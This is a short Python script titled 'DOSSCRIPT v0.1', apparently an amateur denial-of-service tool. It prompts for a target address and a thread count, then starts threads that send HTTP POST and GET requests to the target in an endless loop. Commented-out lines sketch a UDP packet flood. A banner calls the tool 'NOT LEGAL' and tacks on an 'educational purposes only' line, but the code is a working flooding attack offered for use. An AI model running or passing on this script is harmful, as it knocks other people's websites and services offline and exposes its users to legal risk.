import os
#import socket
import requests
import random
import threading
from threading import Thread
import asyncio

#sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#bytes = random._urandom(1490)

os.system("clear")
print("\033[91m")
print(' ___  ____ ____ ____ ____ ____ _ ___  ___ v0.1')
print(' |  \ |  | [__  [__  |    |__/ | |__]  |  ')
print(' |__/ |__| ___] ___] |___ |  \ | |     |  ')
#print('                                          v0.1')
print('Author   : atarwn')
print('Github   : github.com/atarwn')
print('Telegram : t.me/@atarwn')
print('\033[95m                        THIS TOOL IS NOT LEGAL')
print('\033[95m          USE IT FOR EDUCATIONAL PURPOSES ONLY')
print('\033[92m')
ip =       input(" Target  : ")
thr = int(input(" Threads : "))
print('\033[41m\033[37m')

def letsdoit():
    while True:
        try:
            requests.post(ip)
            requests.get(ip)
            print(f"Sent package to {ip}")
        except:
            print(f"Failed to send package to {ip}")
async def start(thr):
    for i in range(int(thr)):
    #while thr:
        Thread(target=letsdoit).start()
        print(f"THREAD {i} STARTED")
if __name__ == "__main__":
    #await start(thr)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start(thr))
    loop.close()

print("All threads started")
